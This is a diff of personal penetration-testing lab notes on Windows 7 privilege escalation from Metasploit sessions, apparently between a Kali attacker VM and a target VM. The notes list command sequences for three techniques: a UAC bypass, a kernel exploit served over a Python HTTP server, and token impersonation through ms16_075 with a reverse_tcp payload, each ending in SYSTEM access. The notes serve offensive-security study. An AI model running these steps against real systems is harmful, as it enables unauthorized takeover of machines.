@@ -7,8 +7,10 @@ linode - HS
 
 
 🟦 Windows  /  Metasploit sessions
- 
-Bypass UAC 
+
+
+(Technique 1) Bypass UAC 
+
 
 meterpreter > sysinfo                   #(x86 version = let's migrate)
 meterpreter > ps
@@ -27,7 +29,9 @@ msf6 exploit(windows/local/bypassuac_injection_winxs) > run
 meterpreter > getuid
 meterpreter > getprivs                  #(see and test the lists)
 
-Use kernel exploits
+
+(Technique 2) Use kernel exploits 
+
 
 meterpreter > sysinfo                   #(x86 version = let's migrate)
 meterpreter > ps
@@ -37,8 +41,6 @@ meterpreter > shell
 
 C:\Windows\system32 > 
 C:\Windows\system32 > systeminfo        #(copy/paste it on a note Windows 7.txt)
-
-
 
  - On Kali (attacker VM)
 
@@ -51,7 +53,6 @@ $ ./windows-explit-suggester.py --database 2021-04-08.xls --systeminfo ~/Desktop
 $ mv 41015.exe exploit.exe
 $ sudo python -m SimpleHTTPServer 80 ....
 
-
  - On Meterpreter / Win7 (targer VM)
  
 meterpreter > getuid
@@ -63,11 +64,47 @@ C:\Temp > dir
 C:\Temp > exploit.exe           #(see the options, number 7 for Win7)
 C:\Temp >.\exploit.exe 
 
-
 #(New Shell)
 
-
 C:\Temp > whoami                   #(NT Authority\system)
+
+
+(Technique 3) How to use Token Impersonation 
+
+meterpreter > load incognito
+meterpreter > list_tokens -u
+meterpreter > background
+
+msf6 exploit(multi/handler) > search ms16_075
+msf6 exploit(multi/handler) > use exploit/windows/local/ms16_075_reflection
+msf6 exploit(windows/local/ms16_075_reflection) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_075_reflection) > set options
+msf6 exploit(windows/local/ms16_075_reflection) > sessions
+msf6 exploit(windows/local/ms16_075_reflection) > set SESSION 2
+msf6 exploit(windows/local/ms16_075_reflection) > run
+
+meterpreter > getuid
+meterpreter > getprivs
+meterpreter > shell
+
+C:\Temp > whoami                      #(win7-pc\win7)
+
+meterpreter > load incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
+meterpreter > getuid                  #(NT Authority\system)
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
